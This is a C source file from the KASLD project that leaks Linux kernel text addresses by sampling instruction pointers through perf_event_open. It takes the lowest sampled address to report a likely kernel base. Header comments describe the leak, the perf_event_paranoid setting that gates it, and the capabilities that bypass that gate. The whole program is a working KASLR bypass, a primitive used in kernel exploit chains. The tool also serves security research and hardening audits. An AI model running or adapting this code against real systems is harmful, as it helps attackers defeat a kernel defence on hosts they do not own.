// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Infer kernel base by sampling kernel events and taking the lowest address
//
// Largely based on original code by lizzie:
// https://blog.lizzie.io/kaslr-and-perf.html
//
// Requires:
// - kernel.perf_event_paranoid < 2 (Default on Ubuntu <= 4.4.0 kernels)
//
// Leak primitive:
//   Data leaked:      kernel text virtual addresses (sampled instruction
//   pointers) Kernel subsystem: kernel/events — perf_event_open syscall Data
//   structure:   struct perf_event → sample IP (instruction pointer) Address
//   type:     virtual (kernel text) Method:           exact (perf event
//   sampling) Status:           gated by design (perf_event_paranoid)
//   Access check:     perf_event_open() checks perf_event_paranoid; requires
//                     CAP_PERFMON or CAP_SYS_ADMIN
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/kernel/events/core.c
//
// Mitigations:
//   kernel.perf_event_paranoid >= 2 (default on most distros) blocks
//   kernel-space sampling. Bypass requires CAP_PERFMON (v5.8+) or
//   CAP_SYS_ADMIN.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include <errno.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Uses the perf_event_open() syscall to sample kernel instruction "
    "pointers during system calls. Each sample reports a raw kernel "
    "text virtual address. Gated by kernel.perf_event_paranoid: values "
    "below 2 allow kernel profiling. Requires CAP_PERFMON (v5.8+) or "
    "CAP_SYS_ADMIN when paranoid >= 2.");

KASLD_META("method:exact\n"
           "addr:virtual\n"
           "sysctl:perf_event_paranoid>=2\n"
           "bypass:CAP_PERFMON\n"
           "bypass:CAP_SYS_ADMIN\n");

int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu,
                    int group_fd, unsigned long flags) {
  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

unsigned long get_kernel_addr_perf() {
  int fd;
  pid_t child;
  unsigned long iterations = 100;

  printf("[.] trying perf_event_open sampling ...\n");

  child = fork();

  if (child == -1) {
    perror("[-] fork");
    return 0;
  }

  if (child == 0) {
    struct utsname self;
    while (1)
      uname(&self);
    return 0;
  }

  struct perf_event_attr event = {.type = PERF_TYPE_SOFTWARE,
                                  .config = PERF_COUNT_SW_TASK_CLOCK,
                                  .size = sizeof(struct perf_event_attr),
                                  .disabled = 1,
                                  .exclude_user = 1,
                                  .exclude_hv = 1,
                                  .sample_type = PERF_SAMPLE_IP,
                                  .sample_period = 10,
                                  .precise_ip = 1};

  fd = perf_event_open(&event, child, -1, -1, 0);

  if (fd < 0) {
    perror("[-] syscall(SYS_perf_event_open)");
    if (child)
      kill(child, SIGKILL);
    if (fd > 0)
      close(fd);
    return 0;
  }

  uint64_t page_size = getpagesize();
  struct perf_event_mmap_page *meta_page = NULL;
  meta_page =
      mmap(NULL, (page_size * 2), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  if (meta_page == MAP_FAILED) {
    perror("[-] mmap");
    if (child)
      kill(child, SIGKILL);
    if (fd > 0)
      close(fd);
    return 0;
  }

  if (ioctl(fd, PERF_EVENT_IOC_ENABLE)) {
    perror("[-] ioctl");
    if (child)
      kill(child, SIGKILL);
    if (fd > 0)
      close(fd);
    return 0;
  }
  char *data_page = ((char *)meta_page) + page_size;

  size_t progress = 0;
  uint64_t last_head = 0;
  size_t num_samples = 0;
  unsigned long min_addr = ~0;
  while (num_samples < iterations) {
    /* is reading from the meta_page racy? no idea */
    while (meta_page->data_head == last_head)
      ;
    ;
    last_head = meta_page->data_head;

    while (progress < last_head) {
      struct __attribute__((packed)) sample {
        struct perf_event_header header;
        uint64_t ip;
      } *here = (struct sample *)(data_page + progress % page_size);
      switch (here->header.type) {
      case PERF_RECORD_SAMPLE:
        num_samples++;
        if (here->header.size < sizeof(*here)) {
          fprintf(stderr, "[-] perf event header size too small\n");
          if (child)
            kill(child, SIGKILL);
          if (fd > 0)
            close(fd);
          return 0;
        }

        uint64_t prefix = here->ip;

        if (prefix < min_addr)
          min_addr = prefix;
        break;
      case PERF_RECORD_THROTTLE:
      case PERF_RECORD_UNTHROTTLE:
      case PERF_RECORD_LOST:
        break;
      default:
        fprintf(stderr, "[-] unexpected perf event: %x\n", here->header.type);
        if (child)
          kill(child, SIGKILL);
        if (fd > 0)
          close(fd);
        return 0;
      }
      progress += here->header.size;
    }
    /* tell the kernel we read it. */
    meta_page->data_tail = last_head;
  }

  if (child)
    kill(child, SIGKILL);
  if (fd > 0)
    close(fd);

  if (min_addr >= KERNEL_BASE_MIN && min_addr <= KERNEL_BASE_MAX)
    return min_addr;

  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_addr_perf();
  if (!addr) {
    printf("[-] no kernel address found via perf_event_open\n");
    return 0;
  }

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "perf_event_open");

  return 0;
}
